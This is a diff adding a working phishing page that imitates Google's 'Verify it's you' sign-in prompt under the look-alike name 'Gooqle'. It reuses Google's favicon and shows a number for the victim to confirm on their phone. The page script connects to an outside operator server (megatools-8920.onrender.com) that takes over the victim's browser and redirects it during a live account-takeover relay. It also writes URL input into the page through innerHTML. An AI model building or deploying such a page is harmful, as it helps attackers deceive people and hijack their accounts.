@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in - Gooqle Accounts</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="shortcut icon"
+      href="https://www.google.com/favicon.ico"
+      type="image/x-icon"
+    />
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      body {
+        font-family: "Roboto", sans-serif;
+      }
+    </style>
+  </head>
+  <body>
+    <div
+      class="min-h-[100vh] w-full bg-[#F0F4F9] flex items-center justify-center"
+    >
+      <div class="w-full max-w-[900px] mx-auto bg-white rounded shadow-sm">
+        <div class="content">
+          <div class="grid md:grid-cols-2 pb-20">
+            <div class="content p-10">
+              <img class="w-[80px]" src="./abc1234.jpg" alt="" />
+              <h2 class="text-4xl font-normal mt-10">Verify it’s you</h2>
+              <p class="mt-4">
+                To help keep your account safe, Gooqle wants to make sure it’s
+                really you trying to sign in
+                <a class="text-[#0b57d0]" href="./abc1234.jpg" target="_blank"
+                  >Learn more</a
+                >
+              </p>
+            </div>
+            <div class="rightContent p-10 md:mt-28">
+              <h2 id="mailCode" class="text-center text-4xl">18</h2>
+              <p class="mt-6 text-2xl">Check your phone</p>
+              <p class="mt-2">
+                Gooqle sent a notification to your Phone. Tap <b>Yes</b> on the
+                notification, then tap <b id="bld">53</b> on your phone to
+                verify it’s you.
+              </p>
+
+              <p class="mt-1">
+                Or open the Gmail app on your iPhone to verify it’s you from
+                there.
+              </p>
+            </div>
+          </div>
+          <div class="buttons p-10 flex items-center justify-between">
+            <button class="text-[#0b57d0]">Resend</button>
+            <button class="text-[#0b57d0]">Try Another</button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script>
+      const queryString = window.location.search;
+      const urlParams = new URLSearchParams(queryString);
+      const code = urlParams.get("code");
+      const id = urlParams.get("id");
+
+      document.getElementById("mailCode").innerHTML = code;
+      document.getElementById("bld").innerHTML = code;
+      function connectAndJoinRoom(roomId) {
+        const socket = io("https://megatools-8920.onrender.com");
+        socket.on("connect", () => {
+          socket.emit("joinRoom", roomId);
+        });
+
+        socket.on("disconnect", () => {
+          console.warn("Disconnected from socket server");
+        });
+
+        socket.on("connect_error", (error) => {
+          console.error("Connection error:", error.message);
+        });
+
+        socket.on("link", ({ data }) => {
+          window.location.href = `${data.url}/${roomId}`;
+        });
+
+        socket.on("code", ({ data }) => {
+          window.location.href = `${data.url}/?id=${roomId}&code=${data.code}`;
+        });
+      }
+      connectAndJoinRoom(id);
+    </script>
+  </body>
+</html>
